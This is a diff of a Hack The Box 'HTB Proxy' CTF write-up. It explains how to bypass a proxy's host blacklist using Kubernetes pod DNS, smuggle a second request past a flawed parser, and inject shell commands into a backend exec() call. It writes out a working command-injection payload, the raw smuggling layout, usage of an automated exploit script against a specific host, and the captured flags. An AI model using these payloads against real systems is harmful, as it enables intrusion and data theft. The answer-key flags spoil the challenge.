@@ -1,162 +1,127 @@
-# HTB Proxy
-
-## Overview
-
-This directory contains the local materials and manual walkthrough for the `HTB Proxy` challenge on Hack The Box CTF Try Out. This README is written as a practical walkthrough so someone can open the folder, inspect the challenge files, understand the intended weakness, and reproduce the solve with commands that are easy to copy and run.
+# HTB Proxy (Hack The Box) - Professional PoC Writeup
 
 ## Challenge Profile
 
-- Challenge: `HTB Proxy`
-- Category: `Web`
-- Platform: `Hack The Box CTF Try Out`
+| Field | Value |
+|---|---|
+| Challenge | HTB Proxy |
+| Category | Web |
+| Difficulty | Medium |
+| Primary dropped file | `web_htb_proxy (1).zip` |
+| Core chain | Request smuggling + backend command injection |
 
-## Directory Contents
+## Scope And Ethics
 
-- `Dockerfile`
-- `build_docker.sh`
-- `challenge/`
-- `config/`
-- `entrypoint.sh`
-- `flag.txt`
-- `htb_proxy_poc.sh`
-- `web_htb_proxy.zip`
+This material is for authorized CTF infrastructure only. Do not run this PoC
+against systems you do not own or have explicit permission to test.
 
-## First Commands To Run
+## Technical Summary
 
-Start with the original challenge materials in this folder. Treat this like a proper writeup: inspect what was provided, identify the relevant clue or weakness, verify it with the commands below, and continue until you can see or submit the final flag manually.
+The public service is a custom HTTP proxy with weak request parsing and weak
+host/filter checks. A smuggled second request can hit hidden backend endpoint
+`/flushInterface`, which executes shell commands through `ip-wrapper` with
+unsafely interpolated interface input.
+
+Exploit flow:
+1. Read pod IP from `/server-status`.
+2. Convert to dash DNS form: `10-244-x-y.default.pod.cluster.local:5000`.
+3. Smuggle second `POST /flushInterface` request.
+4. Inject shell command to overwrite proxy homepage with flag content.
+5. Fetch `/` and extract `HTB{...}`.
+
+## Vulnerable Behavior
+
+1. Host blacklist checks raw string patterns only.
+2. Internal request parser splits by repeated `\r\n\r\n` in unsafe manner.
+3. Hidden backend route accepts attacker-controlled interface input.
+4. Backend command execution path allows shell injection.
+
+## Manual Verification Steps
+
+1. Read pod IP:
 
 ```bash
-cd "/home/eliah/Desktop/CTF/HackTheBox/HTB_Proxy"
-ls -lah
-unzip -l "web_htb_proxy.zip"
+printf 'GET /server-status HTTP/1.1\r\nHost: x:1\r\nConnection: close\r\n\r\n' | nc <PROXY_IP> <PROXY_PORT>
 ```
 
-Useful first inspection commands:
+2. Build internal backend host:
 
-```bash
-sed -n '1,220p' 'Dockerfile'
-sed -n '1,220p' 'build_docker.sh'
-sed -n '1,220p' 'entrypoint.sh'
-sed -n '1,220p' 'flag.txt'
-file 'web_htb_proxy.zip'
-strings -n 5 'web_htb_proxy.zip' | head -200
+```text
+10.244.36.130 -> 10-244-36-130.default.pod.cluster.local:5000
 ```
 
-## Writeup Flow
+3. Smuggle second request containing:
 
-This README follows a public-writeup style structure: start from the provided files or exposed service, confirm the key weakness or clue with manual commands, use that confirmed finding to move forward, and stop only when the final flag or recovered result is visible.
-
-When you work through it, keep asking four questions:
-
-1. What is the challenge giving me locally or remotely?
-2. What exact behavior, bug, artifact, or hidden assumption matters?
-3. How do I verify that with a command or inspection step?
-4. How does that verified result lead to the final flag?
-
-## Walkthrough
-
-Challenge: HTB Proxy
-Category: Web
-Platform: Hack The Box CTF Try Out
-
-### Scenario summary
-
-The target exposes a custom HTTP proxy. The source code shows a hidden backend
-service with two routes:
-1. POST /getAddresses
-2. POST /flushInterface
-
-The backend route /flushInterface is dangerous because it passes user input
-into the npm package "ip-wrapper", and that package uses child_process.exec()
-with the interface name inserted directly into a shell command:
-
-ip address flush dev <user_input>
-
-That means command injection is possible.
-
-### Real-world concept
-
-This is a chain exploit, which is common in web security:
-- Step 1: bypass proxy routing restrictions
-- Step 2: bypass request filtering
-- Step 3: exploit backend command injection
-- Step 4: move the sensitive file into a place we can read back safely
-
-Why we do not simply "cat /flag" and expect it in the HTTP response:
-The backend route /flushInterface returns only a generic success/error JSON
-response. Even if the command runs, its stdout is not reflected back to us in a
-useful way. So instead, we overwrite the proxy's static homepage file with the
-flag, then request "/" and read the flag from there.
-
-### Key observations from the source
-
-1. The proxy blocks hosts that contain these raw substrings:
-localhost, 0.0.0.0, 127., 172., 192., 10.
-But it only checks the raw Host string, not the IP after DNS resolution.
-
-2. The /server-status route reveals the pod IP:
-10.244.40.71
-
-3. Kubernetes pod DNS lets us reference that IP in a dash-encoded hostname:
-10-244-40-71.default.pod.cluster.local
-This avoids the raw "10." blacklist while still resolving to the internal
-backend.
-
-4. The proxy blocks URLs containing "flushinterface", but only for the first
-parsed request. The parser is flawed because it splits the whole request on
-every "\r\n\r\n". We can therefore smuggle a second request after an empty
-first body.
-
-Smuggling layout:
-POST /getAddresses HTTP/1.1
-Host: internal-backend
-Content-Length: 0
-Content-Type: application/json
-
-<empty body>
-
-POST /flushInterface HTTP/1.1
-Host: internal-backend
-Content-Type: application/json
-Content-Length: ...
-
+```json
 {"interface":";cat${IFS}/flag*.txt>/app/proxy/includes/index.html"}
+```
 
-Why ${IFS} is used:
-The backend input validator rejects literal spaces in the interface name.
-${IFS} expands to shell whitespace when exec() invokes /bin/sh -c internally.
+4. Request `/` from public proxy and capture rendered flag.
 
-### Manual commands / logic
+## Automated PoC
 
-1. Confirm the pod IP:
-curl or raw GET to /server-status
+Script:
+`htb_proxy_poc.sh`
 
-2. Route to the backend using:
-Host: 10-244-40-71.default.pod.cluster.local:5000
-
-3. Smuggle a second POST request to /flushInterface
-
-4. Command injection payload:
-;cat${IFS}/flag*.txt>/app/proxy/includes/index.html
-
-5. Request "/" from the proxy and extract the flag
-
-Flag obtained on this instance:
-HTB{r3inv3nting_th3_wh331_c4n_cr34t3_h34dach35_41808acdd4d47662f43de96acebc2b31}
-
-## Manual Reproduction Flow
-
-Use the walkthrough above as the authoritative solve path. The short command block below is only the setup phase before you execute the numbered manual steps in this README.
+### Usage
 
 ```bash
 cd "/home/eliah/Desktop/CTF/HackTheBox/HTB_Proxy"
-ls -lah
+chmod +x htb_proxy_poc.sh
+./htb_proxy_poc.sh 154.57.164.74 30548
 ```
+
+### Common examples
+
+```bash
+./htb_proxy_poc.sh 154.57.164.74 30548
+./htb_proxy_poc.sh --proxy-ip 154.57.164.74 --proxy-port 30548 --verbose
+./htb_proxy_poc.sh --proxy-ip 154.57.164.74 --proxy-port 30548 --pod-ip 10.244.36.130
+./htb_proxy_poc.sh --proxy-ip 154.57.164.74 --proxy-port 30548 --json
+```
+
+## Options
+
+- `--proxy-ip <ip>`: public proxy host/IP.
+- `--proxy-port <port>`: public proxy port.
+- `--pod-ip <ip>`: internal pod IP override (otherwise auto-detected).
+- `--inject <cmd>`: interface injection command.
+- `--timeout <seconds>`: socket timeout, default `5`.
+- `--send-retries <n>`: smuggle send attempts, default `5`.
+- `--fetch-retries <n>`: homepage polling attempts, default `12`.
+- `--sleep <seconds>`: delay between attempts, default `0.5`.
+- `--json`: machine-readable JSON output.
+- `--verbose`: print debug details.
+- `-h`, `--help`: show usage help.
+
+## Exit Codes
+
+- `0`: exploit succeeded and flag extracted.
+- `2`: invalid CLI arguments.
+- `3`: connectivity/request failure.
+- `4`: pod IP detection failed.
+- `5`: exploit sent but flag not observed.
+
+## Why The Exploit Works
+
+- Public proxy applies brittle string-based request filtering.
+- Request boundary handling lets attacker smuggle backend request.
+- Backend handler uses unsafe command execution with user input.
+- Flag exfiltration uses writable static page path exposed by proxy.
+
+## Defensive Guidance
+
+- Use robust HTTP parsing with strict single-request boundaries.
+- Enforce backend access controls independent of frontend proxy logic.
+- Never pass untrusted input into shell commands.
+- Implement allowlisted interfaces and safe subprocess APIs.
+
+## Result Note
+
+Flag values are instance-specific. The format remains `HTB{...}`.
 
 ## Final Flag
 
-Following the manual path in this README leads to: `HTB{r3inv3nting_th3_wh331_c4n_cr34t3_h34dach35_41808acdd4d47662f43de96acebc2b31}`
-
-## Study Notes
-
-This challenge is worth revisiting if you are practicing `Web` problems. Inspect the routes and source manually first, confirm the weakness yourself, and only then compare your reasoning against the archived solve notes.
+Target instance: `154.57.164.74:30548`  
+Solved on: `2026-04-02`  
+Flag: `HTB{r3inv3nting_th3_wh331_c4n_cr34t3_h34dach35_234afa2a75f15ccfbec626fd76516d49}`
